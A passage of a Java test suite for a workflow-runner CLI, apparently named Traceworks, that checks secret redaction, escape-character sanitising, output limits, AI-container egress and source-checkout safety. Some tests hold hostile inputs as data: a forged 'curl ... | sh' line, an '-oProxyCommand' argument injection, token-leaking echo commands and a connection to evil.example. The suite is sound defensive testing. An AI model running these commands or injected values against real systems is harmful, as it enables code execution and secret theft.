        Files.writeString(home.resolve("traceworks.json"), "{\"secret_names\": [\"API_TOKEN\"]}");
        com.fasterxml.jackson.databind.ObjectMapper json = new com.fasterxml.jackson.databind.ObjectMapper();
        String leak = "echo \"token=$DEPLOY_TOKEN api=$API_TOKEN\"; echo \"$DEPLOY_TOKEN\" > {{ scratch_dir }}/out.txt;"
                + " echo \"warning: $API_TOKEN\" >&2";
        String fail = "echo \"refused: $DEPLOY_TOKEN\" >&2; exit 3";
        // A later step's command holds the real value, taken from the earlier output: the record redacts it there
        String again = "echo again: {{ block.leak.output }}";
        Path pkg = pkg("secret", "{\"type\":\"shell\",\"name\":\"leak\",\"config\":{\"command\":"
                + json.writeValueAsString(leak) + ",\"secrets\":[\"DEPLOY_TOKEN\",\"API_TOKEN\"]}},"
                + "{\"type\":\"shell\",\"name\":\"again\",\"config\":{\"command\":"
                + json.writeValueAsString(again) + ",\"shell_escape_variables\":true}},"
                + "{\"type\":\"shell\",\"name\":\"fail\",\"config\":{\"command\":" + json.writeValueAsString(fail)
                + ",\"secrets\":[\"DEPLOY_TOKEN\"]}}");

        Result run = runHost(pkg);
        String id = idOf(run);
        Result show = exec("show", id);
        Path folder = runFolder(id);

        assertThat(run.code()).as(run.out() + run.err()).isEqualTo(3);
        assertThat(Files.readString(folder.resolve("scratch/out.txt"))).as("the step got its secret")
                .isEqualTo(fileSecret + "\n");
        assertThat(run.out()).contains("[redacted:DEPLOY_TOKEN]", "[redacted:API_TOKEN]")
                .contains("output: again: token=[redacted:DEPLOY_TOKEN]");
        for (String text : List.of(run.out(), run.err(), show.out(), show.err())) {
            assertThat(text).doesNotContain(fileSecret).doesNotContain(envSecret);
        }
        List<Path> written;
        try (Stream<Path> files = Files.walk(home)) {
            written = files.filter(Files::isRegularFile).filter(p -> !p.equals(credentials))
                    .filter(p -> !p.startsWith(folder.resolve("scratch"))).toList();
        }
        assertThat(written).contains(folder.resolve("events.jsonl"), folder.resolve("run.html"),
                folder.resolve("manifest.json"));
        for (Path file : written) {
            String bytes = new String(Files.readAllBytes(file), StandardCharsets.ISO_8859_1);
            assertThat(bytes).as(file.toString()).doesNotContain(fileSecret).doesNotContain(envSecret);
        }
        assertThat(Files.readString(folder.resolve("run.html"))).contains("[redacted:DEPLOY_TOKEN]");
        String checkpoint = Files.readAllLines(folder.resolve("events.jsonl")).stream()
                .map(line -> {
                    try {
                        return json.readTree(line);
                    } catch (IOException e) {
                        throw new java.io.UncheckedIOException(e);
                    }
                })
                .filter(line -> line.path("type").asText().equals("run.checkpoint")).toList().getLast()
                .path("state").path("sha256").asText();
        String output = json.readTree(Files.readString(folder.resolve("blobs").resolve(checkpoint)))
                .at("/steps/0/output/sha256").asText();
        assertThat(Files.readString(folder.resolve("blobs").resolve(output)))
                .contains("token=[redacted:DEPLOY_TOKEN] api=[redacted:API_TOKEN]");
        assertThat(show.out()).contains("[redacted:DEPLOY_TOKEN]");
    }

    @Test
    void filesOfAStep_areInShowAndRunHtml_withSanitisedNames() throws Exception {
        String command = "for d in " + home + "/runs/*/*/scratch; do echo data > \"$d/note.txt\"; "
                + ": > \"$d/$(printf 'e\\033[31mvil\\342\\200\\256x')\"; done";
        String block = "{\"type\":\"shell\",\"name\":\"write\",\"config\":{\"command\":"
                + new com.fasterxml.jackson.databind.ObjectMapper().writeValueAsString(command) + "}}";
        Path pkg = pkg("files", block);

        Result run = runHost(pkg);
        String id = idOf(run);
        Result show = exec("show", id);
        String html = Files.readString(runFolder(id).resolve("run.html"));

        assertThat(run.code()).as(run.out() + run.err()).isZero();
        assertThat(runFolder(id).resolve("scratch/note.txt")).isRegularFile();
        assertThat(show.out()).containsPattern("(?m)^      file note\\.txt  5 bytes  blob [0-9a-f]{64}$")
                .contains("file e?[31mvil?x").doesNotContain("\u001b").doesNotContain("‮");
        assertThat(html).contains("<code>note.txt</code>").contains("<a href=\"blobs/")
                .doesNotContain("\u001b").doesNotContain("‮").contains("[U+001B][31mvil[U+202E]x");
    }

    @Test
    void theRunId_comesFromTheSummaryLine_notFromTheFirstUuidInTheOutput() throws IOException {
        Path pkg = pkg("uuid", """
                {"type":"shell","name":"say","config":{"command":"echo 11111111-2222-3333-4444-555555555555"}}""");

        Result r = runHost(pkg);
        String id = idOf(r);

        assertThat(id).isNotEqualTo("11111111-2222-3333-4444-555555555555");
        assertThat(runFolder(id)).isDirectory();
    }

    @Test
    void run_quiet_printsOnlyTheSummary() throws IOException {
        Result r = runHost(plainPackage(), "--quiet");

        assertThat(r.code()).isZero();
        assertThat(r.out()).doesNotContain("step 0").contains("COMPLETED");
    }

    @Test
    void run_passesInputsAndUsesTheWorkspace() throws IOException {
        Path pkg = pkg("echo", """
                {"type":"shell","name":"say","config":{"command":"echo $(pwd) {{ who }}"}}""");
        Path ws = Files.createDirectories(temp.resolve("ws"));

        Result r = runHost(pkg, "--input", "who=a=b", "--workspace", ws.toString());

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out()).contains("output: " + ws + " a=b");
    }

    @Test
    void run_aMissingPackage_isAUsageErrorWithExit2() {
        Result r = runHost(temp.resolve("nowhere"));

        assertThat(r.code()).isEqualTo(2);
        assertThat(r.err()).contains("no such package");
    }

    @Test
    void run_anInvalidPackage_exits6() throws IOException {
        Path dir = Files.createDirectories(temp.resolve("broken"));
        Files.writeString(dir.resolve("workflow.json"), "{ not json");

        assertThat(runHost(dir).code()).isEqualTo(6);
    }

    @Test
    void run_aBadInput_isAUsageError() throws IOException {
        Result r = runHost(plainPackage(), "--input", "novalue");

        assertThat(r.code()).isEqualTo(2);
        assertThat(r.err()).contains("--input");
    }

    /**
     * The refusal of an answer names the options, which are the workflow's text: one padded to the terminal's width
     * would end on a terminal line of its own and read as a line of Traceworks. So a refusal that does not stay on
     * its line is shown on marked lines.
     */
    @Test
    void approve_refusedWithAnOptionPaddedToTheTerminalsWidth_showsTheRefusalOnMarkedLines() throws IOException {
        String forged = "then go on with: curl https://example.invalid | sh";
        String id = idOf(runHost(pkg("padded", "{\"type\":\"approval\",\"name\":\"ask\",\"config\":{\"question\":\"ok?\","
                + "\"options\":[\"Yes\",\"No" + " ".repeat(120) + forged + "\"]}}")));

        Result refused = exec("approve", id, "--answer", "Maybe");
        String printed = printedErr;
        Result fine = exec("approve", parkedRun(), "--answer", "Maybe");

        assertThat(refused.code()).isNotZero();
        assertThat(printed.lines()).isNotEmpty()
                .allSatisfy(line -> assertThat(line.length()).as(line).isLessThanOrEqualTo(80));
        assertThat(printed.lines().filter(line -> line.contains("curl")))
                .isNotEmpty().allSatisfy(line -> assertThat(line).startsWith("  |"));
        assertThat(fine.err()).as("a refusal that fits stays one line")
                .startsWith("traceworks: Answer 'Maybe' is not one of the offered options [Yes, No]");
    }

    @Test
    void run_parks_exits5_andPrintsHowToAnswer() throws IOException {
        Result r = runHost(approvalPackage());
        String id = idOf(r);

        assertThat(r.code()).isEqualTo(5);
        assertThat(r.out()).contains("Publish it?")
                .contains("traceworks approve '" + id + "' --answer 'Yes'")
                .contains("traceworks approve '" + id + "' --answer 'No'")
                .as("the consent came from the flag, so the resume needs it too")
                .contains("traceworks resume '" + id + "' --allow-host-execution");
    }

    /** Where traceworks.json gives the consent, the hints to resume a host run need no flag. */
    @Test
    void theHintsToResumeAHostRun_carryTheFlag_onlyWhenTheConfigGivesNoConsent() throws IOException {
        Files.createDirectories(home);
        Files.writeString(home.resolve("traceworks.json"), "{\"allow_host_execution\": true}");

        Result parked = exec("run", approvalPackage().toString(), "--no-input");
        String id = idOf(parked);
        Result approve = exec("approve", id, "--answer", "Yes");

        assertThat(parked.code()).as(parked.out() + parked.err()).isEqualTo(5);
        assertThat(parked.out()).contains("on the host (no container runtime works)")
                .contains("traceworks resume '" + id + "'").doesNotContain("--allow-host-execution");
        assertThat(approve.out()).contains("traceworks resume").doesNotContain("--allow-host-execution");
    }

    // ---- an output cut at the bound ----

    /**
     * A host step whose command leaves a writer behind: the reading of its output ends at the bound, and the record
     * says so in the command's end. The step and the run are as they would be; {@code show}, {@code run.html} and the
     * live lines mark it, and the record verifies. A step whose output ended has no such field.
     */
    @Test
    void aHostCommandThatLeavesAWriterBehind_hasItsOutputCutInTheRecord_andTheViewsMarkIt() throws IOException {
        Path pkg = pkg("server", """
                {"type":"shell","name":"serve","config":{"command":
                  "(trap '' PIPE; while echo tick; do sleep 0.05; done 2>/dev/null) & echo early"}},
                {"type":"shell","name":"plain","config":{"command":"echo fine"}}""");

        Result run = runHost(pkg);
        String id = idOf(run);
        Result show = exec("show", id);
        Result verify = exec("verify", id);

        assertThat(run.code()).as(run.out() + run.err()).isZero();
        com.fasterxml.jackson.databind.ObjectMapper json = new com.fasterxml.jackson.databind.ObjectMapper();
        List<com.fasterxml.jackson.databind.JsonNode> ends = new ArrayList<>();
        for (String line : Files.readAllLines(runFolder(id).resolve("events.jsonl"))) {
            com.fasterxml.jackson.databind.JsonNode event = json.readTree(line);
            if (event.path("type").asText().equals("step.command.finished")) {
                ends.add(event);
            }
        }
        assertThat(ends).hasSize(2);
        assertThat(ends.getFirst().path("output_cut"))
                .isEqualTo(json.readTree("{\"streams\":[\"stdout\"],\"after_ms\":5000}"));
        assertThat(ends.getFirst().path("exit_code").asInt()).isZero();
        assertThat(ends.get(1).has("output_cut")).as("an output that ended").isFalse();
        assertThat(run.out()).contains("(output cut: stdout after 5000 ms)");
        assertThat(show.out()).contains("Status    COMPLETED\n",
                "Output    1 command whose output was CUT before the end of its stream: it may be incomplete\n",
                "      output CUT     stdout after 5000 ms   <== may be incomplete\n");
        assertThat(show.out().split("output CUT", -1)).as("the other step is not marked").hasSize(2);
        assertThat(Files.readString(runFolder(id).resolve("run.html")))
                .contains("<strong class=\"problem\">output cut: stdout after 5000 ms</strong>");
        assertThat(verify.code()).as(verify.out() + verify.err()).isZero();
    }

    // ---- the output limit ----

    /**
     * {@code output_limit_mib} reaches the host runner: a step that prints 2 MiB fails at a limit of 1 MiB with exit
     * code 153 and the note that names 1 MiB, and {@code run.started} records the limit.
     */
    @Test
    void outputLimitMib_stopsAHostCommandAtTheOperatorsLimit_andIsRecorded() throws IOException {
        Files.writeString(home.resolve("traceworks.json"), "{\"output_limit_mib\": 1}");
        Path pkg = pkg("loud", """
                {"type":"shell","name":"loud","config":{"command":"head -c 2097152 /dev/zero | tr '\\\\0' y"}}""");

        Result r = runHost(pkg);

        assertThat(r.code()).as(r.out() + r.err()).isEqualTo(3);
        assertThat(r.out()).contains("exit 153", "(stdout beyond 1 MiB)");
        Path folder = runFolder(idOf(r));
        com.fasterxml.jackson.databind.ObjectMapper json = new com.fasterxml.jackson.databind.ObjectMapper();
        List<com.fasterxml.jackson.databind.JsonNode> events = new ArrayList<>();
        for (String line : Files.readAllLines(folder.resolve("events.jsonl"))) {
            events.add(json.readTree(line));
        }
        assertThat(events.getFirst().path("output_limit_mib").asInt()).isEqualTo(1);
        com.fasterxml.jackson.databind.JsonNode output = events.stream()
                .filter(e -> e.path("type").asText().equals("step.output")).findFirst().orElseThrow();
        String text = Files.readString(folder.resolve("blobs").resolve(output.path("output").path("sha256").asText()));
        assertThat(text).startsWith("y".repeat(1024 * 1024) + "\nThe command's standard output exceeded 1 MiB;"
                + " Traceworks stopped it and kept the first 1 MiB").contains("went beyond 1 MiB")
                .doesNotContain("16 MiB");
    }

    /**
     * {@code output_limit_mib} is no workflow key, so a package cannot raise its own limit: in a block's config it has
     * no effect and {@code check} warns about it, and at the top of a workflow the package does not load.
     */
    @Test
    void outputLimitMib_isNoWorkflowKey() throws IOException {
        Files.writeString(home.resolve("traceworks.json"), "{\"output_limit_mib\": 1}");
        Path pkg = pkg("raise", """
                {"type":"shell","name":"loud","config":{"command":"head -c 2097152 /dev/zero | tr '\\\\0' y",\
                "output_limit_mib":1024}}""");

        Result check = exec("check", pkg.toString());
        Result run = runHost(pkg);

        assertThat(check.out()).containsPattern("(?m)^WARNING +unknown-config-key +loud \\(block 0\\): unknown config"
                + " key output_limit_mib");
        assertThat(run.code()).as(run.out() + run.err()).isEqualTo(3);
        assertThat(run.out()).contains("(stdout beyond 1 MiB)");
        Files.writeString(pkg.resolve("workflow.json"), Files.readString(pkg.resolve("workflow.json"))
                .replace("\"blocks\"", "\"output_limit_mib\":1024,\"blocks\""));
        Result refused = exec("check", pkg.toString());
        assertThat(refused.code()).isEqualTo(6);
        assertThat(refused.err()).contains("output_limit_mib");
    }

    /** The container runtime gets the operator's limit for a run and for a build, as the host runner does. */
    @Test
    void outputLimitMib_reachesTheContainerRuntime_forARun_andForImagesBuild() throws IOException {
        Files.writeString(home.resolve("traceworks.json"), "{\"output_limit_mib\": 4}");
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64));
        List<Integer> limits = new ArrayList<>();
        RuntimeSource source = (configured, traceworksHome, limit) -> {
            limits.add(limit);
            return java.util.Optional.of(runtime);
        };

        Result run = execWith(source, null, "run", plainPackage().toString(), "--no-input");
        Result build = execWith(source, null, "images", "build");

        assertThat(run.code()).as(run.out() + run.err()).isZero();
        assertThat(build.code()).as(build.out() + build.err()).isZero();
        assertThat(limits).containsExactly(4 * 1024 * 1024, 4 * 1024 * 1024);
    }

    /** A limit outside 1 to 1024, or no integer, refuses every command that reads the config, like any bad value. */
    @Test
    void outputLimitMib_outsideItsRange_isRefused_withExit6() throws IOException {
        for (String bad : List.of("0", "1025", "\"16\"", "1.5")) {
            Files.writeString(home.resolve("traceworks.json"), "{\"output_limit_mib\": " + bad + "}");

            Result run = runHost(plainPackage());
            Result runs = exec("runs");

            assertThat(run.code()).as(bad).isEqualTo(6);
            assertThat(run.err()).as(bad).contains("'output_limit_mib' in " + home.resolve("traceworks.json")
                    + " must be an integer from 1 to 1024 (MiB), not " + bad);
            assertThat(runs.code()).as(bad).isEqualTo(6);
        }
        assertThat(home.resolve("runs")).as("no run was created").doesNotExist();
    }

    // ---- the egress of an AI step ----

    private static final String CLAUDE_STREAM = """
            {"type":"system","subtype":"init","cwd":"/workspace","session_id":"s-1","tools":[]}
            {"type":"result","subtype":"success","result":"hi","usage":{"input_tokens":12,"output_tokens":3}}
            """;

    /** A runtime with the shell, claude and egress images, whose Claude container asked the proxy for {@code asked}. */
    private static FakeContainerRuntime runtimeWithClaude(List<Connection> asked) {
        String claudeId = "sha256:" + "c".repeat(64);
        return new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64))
                .present(builtInTag("claude"), claudeId).present(builtInTag("egress"), "sha256:" + "e".repeat(64))
                .on(claudeId, FakeCommandRunner.ok(CLAUDE_STREAM).withConnections(asked));
    }

    /**
     * An AI call's container reaches its provider only, and the record says what it asked for. {@code show} and
     * {@code run.html} name the allowed hosts and every connection; a denied one is marked and counted, and fails
     * nothing.
     */
    @Test
    void anAiStepsEgress_isInShowAndRunHtml_andADeniedConnectionIsMarked_withoutFailingTheRun() throws IOException {
        FakeContainerRuntime runtime = runtimeWithClaude(List.of(new Connection("api.anthropic.com:443", "ALLOW", 3),
                new Connection("evil.example:443", "DENY", 2)));
        env.put("ANTHROPIC_API_KEY", "sk-ant-api03-not-a-real-key-0000");
        Path pkg = pkg("ask", """
                {"type":"simple","name":"ask","config":{"command":"Say hi"}}""");

        Result run = execWith(runtime, null, "run", pkg.toString(), "--no-input");
        Result show = exec("show", idOf(run));

        assertThat(run.code()).as(run.out() + run.err()).isZero();
        ContainerRuntime.ContainerRun call = runtime.runs().getFirst();
        assertThat(call.network()).isEqualTo(Egress.hosts(List.of("api.anthropic.com:443")));
        assertThat(call.egressImageId()).isEqualTo("sha256:" + "e".repeat(64));
        assertThat(run.err()).doesNotContain("ai_network");
        assertThat(show.out()).contains("AI net    restricted\n",
                "Egress    5 connections asked of the egress proxy by 1 command, 2 DENIED\n",
                "      network hosts api.anthropic.com:443\n",
                "      egress ALLOW   api.anthropic.com:443  x3\n",
                "      egress DENIED  evil.example:443  x2   <== not allowed\n");
        assertThat(Files.readString(runFolder(idOf(run)).resolve("run.html")))
                .contains("network <code>hosts</code> <code>api.anthropic.com:443</code>",
                        "egress DENIED <code>evil.example:443</code> &times;2", "2 denied");
    }

    /** With {@code ai_network: "open"} an AI container has the default network, as before, and a note says so. */
    @Test
    void anOpenAiNetwork_andTheOperatorsHosts_areNotedAtTheStart_andShown() throws IOException {
        Files.writeString(home.resolve("traceworks.json"),
                "{\"ai_network\": \"open\", \"ai_hosts\": {\"claude\": [\"gateway.example:8443\"]}}");
        FakeContainerRuntime runtime = runtimeWithClaude(List.of());
        env.put("ANTHROPIC_API_KEY", "sk-ant-api03-not-a-real-key-0000");
        Path pkg = pkg("ask", """
                {"type":"simple","name":"ask","config":{"command":"Say hi"}}""");

        Result run = execWith(runtime, null, "run", pkg.toString(), "--no-input");
        Result show = exec("show", idOf(run));

        assertThat(run.code()).as(run.out() + run.err()).isZero();
        assertThat(runtime.runs().getFirst().network()).isEqualTo(Egress.OPEN);
        assertThat(run.err()).contains("traceworks: note: ai_network: open: the container of an AI step can connect"
                + " anywhere, not only to its provider\n");
        assertThat(show.out()).contains("AI net    open (every AI container can connect anywhere); more hosts for"
                + " claude: gateway.example:8443\n").doesNotContain("Egress  ");

        Files.writeString(home.resolve("traceworks.json"), "{\"ai_hosts\": {\"claude\": [\"gateway.example:8443\"]}}");
        Result restricted = execWith(runtime, null, "run", pkg.toString(), "--no-input");
        assertThat(restricted.err()).contains("traceworks: note: ai_hosts: the containers of claude also reach"
                + " gateway.example:8443\n").doesNotContain("ai_network");
        assertThat(runtime.runs().getLast().network()).isEqualTo(Egress.hosts(
                List.of("api.anthropic.com:443", "gateway.example:8443")));
    }

    /** A value that is no mode or no host refuses every command that reads the config, exit 6, naming the key. */
    @Test
    void anInvalidAiNetworkOrAiHost_isRefused() throws IOException {
        for (String bad : List.of("{\"ai_network\": \"closed\"}", "{\"ai_hosts\": {\"claude\": [\"*.example:443\"]}}",
                "{\"ai_hosts\": {\"codex\": []}}")) {
            Files.writeString(home.resolve("traceworks.json"), bad);

            Result run = exec("run", plainPackage().toString(), "--no-input");

            assertThat(run.code()).as(bad).isEqualTo(6);
            assertThat(run.err()).as(bad).containsPattern("ai_network|ai_hosts");
        }
    }

    // ---- ai_images ----

    /** {@code ai_images} is printed as a note on stderr at the start of a run, one line for each replacement. */
    @Test
    void aiImages_areNotedOnStderr_atTheStartOfARun() throws IOException {
        Files.writeString(home.resolve("traceworks.json"),
                "{\"ai_images\": {\"pi\": \"pi:2\", \"claude\": \"registry.example/claude:7\"}}");
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64));

        Result run = execWith(runtime, null, "run", plainPackage().toString(), "--no-input");

        assertThat(run.code()).as(run.out() + run.err()).isZero();
        assertThat(run.err()).contains("traceworks: note: ai_images: claude runs in registry.example/claude:7"
                + " instead of the built-in image\n", "traceworks: note: ai_images: pi runs in pi:2 instead of"
                + " the built-in image\n");
        Files.writeString(home.resolve("traceworks.json"), "{\"ai_images\": {}}");
        Result plain = execWith(runtime, null, "run", plainPackage().toString(), "--no-input");
        assertThat(plain.err()).doesNotContain("ai_images");
    }

    /** An unknown CLI or a value that is no image reference refuses every command that reads the config, exit 6. */
    @Test
    void aiImages_thatAreInvalid_areRefused_withExit6() throws IOException {
        for (String bad : List.of("{\"codex\": \"x:1\"}", "{\"claude\": \"-x\"}", "{\"claude\": \"a b\"}",
                "{\"claude\": \"./images/x\"}", "{\"claude\": 5}", "[]")) {
            Files.writeString(home.resolve("traceworks.json"), "{\"ai_images\": " + bad + "}");

            Result run = runHost(plainPackage());
            Result runs = exec("runs");

            assertThat(run.code()).as(bad).isEqualTo(6);
            assertThat(run.err()).as(bad).contains("ai_images");
            assertThat(runs.code()).as(bad).isEqualTo(6);
        }
        assertThat(home.resolve("runs")).as("no run was created").doesNotExist();
    }

    @Test
    void run_failingStep_exits3() throws IOException {
        Result r = runHost(pkg("bad", """
                {"type":"shell","name":"boom","config":{"command":"exit 3","checked_command":true}}"""));

        assertThat(r.code()).isEqualTo(3);
        assertThat(r.out()).contains("FAILED");
    }

    @Test
    void failOnGateRed_exits7() throws IOException {
        Path red = pkg("red", """
                {"type":"shell","name":"lint","config":{"command":"echo 'gate_status: RED'"}}""");
        Path yellow = pkg("yellow", """
                {"type":"shell","name":"lint","config":{"command":"echo 'gate_status: YELLOW'"}}""");

        assertThat(runHost(red).code()).isZero();
        assertThat(runHost(red, "--fail-on-gate", "red").code()).isEqualTo(7);
        assertThat(runHost(yellow, "--fail-on-gate", "red").code()).isZero();
        assertThat(runHost(yellow, "--fail-on-gate", "yellow").code()).isEqualTo(7);
        assertThat(runHost(red, "--fail-on-gate", "blue").code()).isEqualTo(2);
    }

    @Test
    void run_onATerminal_asksTheQuestion_andGoesOn() throws IOException {
        Result r = execWithConsole("maybe\nYES\n", "run", approvalPackage().toString(), "--allow-host-execution");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out()).contains("Publish it?", "Yes / No", "answered: Yes", "output: done");
        assertThat(r.out()).contains("not one of");
    }

    // ---- run --source ----

    /** git for setting a source repository up, with a configuration of its own; its output. */
    private static String sourceGit(Path dir, String... args) throws IOException, InterruptedException {
        List<String> command = new ArrayList<>(List.of("git", "-C", dir.toString(), "-c", "user.name=t",
                "-c", "user.email=t@t.invalid", "-c", "commit.gpgsign=false", "-c", "init.defaultBranch=main"));
        command.addAll(List.of(args));
        ProcessBuilder builder = new ProcessBuilder(command).redirectErrorStream(true);
        builder.environment().keySet().removeIf(name -> name.startsWith("GIT_"));
        builder.environment().put("GIT_CONFIG_GLOBAL", "/dev/null");
        builder.environment().put("GIT_CONFIG_NOSYSTEM", "1");
        Process process = builder.start();
        String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        assertThat(process.waitFor()).as("git " + String.join(" ", args) + ": " + output).isZero();
        return output.strip();
    }

    /** A repository in the working directory, {@code work/repo}, with {@code hello.txt} on {@code main}. */
    private Path repository() throws IOException, InterruptedException {
        Path repo = Files.createDirectories(work.resolve("repo"));
        sourceGit(repo, "init", "-q");
        Files.writeString(repo.resolve("hello.txt"), "from the source\n");
        sourceGit(repo, "add", "hello.txt");
        sourceGit(repo, "commit", "-q", "-m", "hello");
        return repo;
    }

    private Path readerPackage() throws IOException {
        return pkg("reader", """
                {"type":"shell","name":"read",
                 "config":{"command":"cat hello.txt; echo sha={{ workspace_source_sha }}"}}""");
    }

    @Test
    void sourceAndWorkspace_excludeEachOther() throws IOException {
        Result r = exec("run", plainPackage().toString(), "--source", "/srv/repo", "--workspace", work.toString());

        assertThat(r.code()).isEqualTo(2);
        assertThat(r.err()).contains("--source", "--workspace");
        assertThat(home.resolve("runs")).doesNotExist();
    }

    @Test
    void ref_withoutASource_isAUsageError() throws IOException {
        Result r = exec("run", plainPackage().toString(), "--ref", "main");

        assertThat(r.code()).isEqualTo(2);
        assertThat(r.err()).contains("--ref", "--source");
    }

    /**
     * A host run with a relative source path works in a checkout of it below the home, which stays: a command on the
     * host could write in it, and the summary names it.
     */
    @Test
    void run_withASource_worksInItsCheckout_andRecordsIt() throws Exception {
        Path repo = repository();
        String sha = sourceGit(repo, "rev-parse", "HEAD");

        Result r = runHost(readerPackage(), "--source", "repo", "--ref", "main");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out()).contains("from the source", "sha=" + sha);
        String id = idOf(r);
        Path checkout = home.resolve("workspaces").resolve(id);
        assertThat(checkout.resolve("hello.txt")).hasContent("from the source");
        assertThat(r.out()).contains("kept    " + checkout.toRealPath());
        String started = Files.readAllLines(runFolder(id).resolve("events.jsonl")).getFirst();
        assertThat(started).contains("\"workspace\":\"" + checkout.toRealPath() + "\"",
                "\"workspace_source\":\"" + repo + "\"", "\"workspace_source_sha\":\"" + sha + "\"");
    }

    /**
     * A run whose finalisation fails ends in an internal error, and the message names the checkout it leaves, which
     * the summary would have named.
     */
    @Test
    void run_withASource_whoseLedgerFails_namesTheCheckoutItLeaves() throws Exception {
        Path repo = repository();
        Files.createDirectories(home.resolve("ledger"));
        Files.writeString(home.resolve("ledger").resolve("runs"), "a file where the ledger keeps its entries");

        Result r = runHost(readerPackage(), "--source", repo.toString());

        assertThat(r.code()).as(r.out() + r.err()).isEqualTo(70);
        try (Stream<Path> checkouts = Files.list(home.resolve("workspaces"))) {
            Path checkout = checkouts.findFirst().orElseThrow();
            assertThat(r.err()).contains("internal error", "the checkout " + checkout.toRealPath() + " of the run's"
                    + " source stays");
        }
    }

    /** In containers, which see the checkout read-only, nothing of it is left once the run has finished. */
    @Test
    void run_withASource_inContainers_leavesNoCheckout() throws Exception {
        Path repo = repository();
        String shellId = "sha256:" + "5".repeat(64);
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), shellId)
                .on(shellId, FakeCommandRunner.ok("read in a container\n"));

        Result r = execWith(runtime, null, "run", readerPackage().toString(), "--source", repo.toString(),
                "--no-input");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        String id = idOf(r);
        assertThat(runtime.runs().getFirst().mounts().getFirst().hostPath())
                .isEqualTo(home.toRealPath().resolve("workspaces").resolve(id).toString());
        assertThat(runtime.runs().getFirst().mounts().getFirst().readOnly()).isTrue();
        assertThat(home.resolve("workspaces").resolve(id)).doesNotExist();
        assertThat(r.out()).doesNotContain("kept ");
    }

    /** The credentials of a URL reach neither the record, the terminal nor the checkout. */
    @Test
    void run_withCredentialsInTheSourceUrl_recordsAndShowsThemNowhere() throws Exception {
        Path repo = repository();

        Result r = runHost(readerPackage(), "--source", "file://user:s3cr3t-T0KEN@localhost" + repo);

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out() + r.err()).doesNotContain("s3cr3t");
        String id = idOf(r);
        assertThat(Files.readString(runFolder(id).resolve("events.jsonl")))
                .contains("\"workspace_source\":\"file://localhost" + repo + "\"").doesNotContain("s3cr3t");
        try (Stream<Path> files = Files.walk(home)) {
            for (Path file : files.filter(Files::isRegularFile).toList()) {
                assertThat(new String(Files.readAllBytes(file), StandardCharsets.ISO_8859_1)).as(file.toString())
                        .doesNotContain("s3cr3t");
            }
        }
        Result failed = runHost(readerPackage(), "--source",
                "file://user:s3cr3t-T0KEN@localhost" + temp.resolve("none"));
        assertThat(failed.code()).isEqualTo(6);
        assertThat(failed.out() + failed.err()).contains("file://localhost").doesNotContain("s3cr3t");
    }

    /** A directory in the runs' checkouts, with a git repository and a package in it. */
    private Path inTheCheckouts() throws IOException, InterruptedException {
        Path checkout = Files.createDirectories(home.resolve("workspaces").resolve("run-0"));
        sourceGit(checkout, "init", "-q");
        Files.writeString(checkout.resolve("hello.txt"), "from a checkout\n");
        sourceGit(checkout, "add", "hello.txt");
        sourceGit(checkout, "commit", "-q", "-m", "hello");
        Path pkg = Files.createDirectories(checkout.resolve("pkg"));
        Files.writeString(pkg.resolve("workflow.json"), "{\"id\":\"inside\",\"name\":\"inside\",\"blocks\":["
                + "{\"type\":\"shell\",\"name\":\"say\",\"config\":{\"command\":\"echo hello\"}}]}");
        return checkout;
    }

    /**
     * git on the host reads nothing of a run's checkout: a package there and a local source there (a path, a
     * {@code file://} URL) are refused at the start, and no run is created.
     */
    @Test
    void run_ofAPackageOrASourceInTheCheckouts_isRefused() throws Exception {
        Path checkout = inTheCheckouts();

        Result pkg = runHost(checkout.resolve("pkg"));
        Result path = runHost(readerPackage(), "--source", checkout.toString());
        Result url = runHost(readerPackage(), "--source", "file://" + checkout);

        for (Result r : List.of(pkg, path, url)) {
            assertThat(r.code()).as(r.out() + r.err()).isEqualTo(6);
            assertThat(r.err()).contains("lies in " + home.resolve("workspaces"), "checkout");
        }
        assertThat(home.resolve("runs")).doesNotExist();
    }

    /**
     * A resume is refused as well when the package it loads, or the source it would clone again, has come to lie in
     * the checkouts: here the package directory and the source became links into them.
     */
    @Test
    void resume_ofAPackageOrASourceNowInTheCheckouts_isRefused() throws Exception {
        Path checkout = inTheCheckouts();
        Path repo = repository();
        Path deploy = approvalPackage();
        String byPackage = idOf(runHost(deploy));
        String bySource = idOf(runHost(deploy, "--source", repo.toString()));
        for (String id : List.of(byPackage, bySource)) {
            assertThat(exec("approve", id, "--answer", "Yes").code()).isZero();
        }

        Path moved = checkout.resolve("deploy");
        Files.move(deploy, moved);
        Files.createSymbolicLink(deploy, moved);
        Result resumedPackage = exec("resume", byPackage, "--no-input", "--allow-host-execution");
        Files.delete(deploy);
        Files.move(moved, deploy);
        deleteTree(home.resolve("workspaces").resolve(bySource));
        deleteTree(repo);
        Files.createSymbolicLink(repo, checkout);
        Result resumedSource = exec("resume", bySource, "--no-input", "--allow-host-execution");

        for (Result r : List.of(resumedPackage, resumedSource)) {
            assertThat(r.code()).as(r.out() + r.err()).isEqualTo(6);
            assertThat(r.err()).contains("lies in " + home.resolve("workspaces"));
        }
        assertThat(home.resolve("workspaces").resolve(bySource)).doesNotExist();
    }

    private static void deleteTree(Path dir) throws IOException {
        try (Stream<Path> walk = Files.walk(dir)) {
            for (Path path : walk.sorted(java.util.Comparator.reverseOrder()).toList()) {
                path.toFile().setWritable(true);
                Files.delete(path);
            }
        }
    }

    @Test
    void run_withASourceThatStartsWithADash_isRefused() throws IOException {
        Result r = runHost(readerPackage(), "--source=-oProxyCommand=touch " + temp.resolve("ran"));

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err()).contains("starts with '-'");
        assertThat(temp.resolve("ran")).doesNotExist();
        assertThat(home.resolve("runs")).doesNotExist();
    }

    // ---- approve, answer, resume, cancel ----

    @Test
    void approve_thenResume_exits0() throws IOException {
        String id = parkedRun();

        Result approve = exec("approve", id, "--answer", "Yes", "--comment", "ship it");
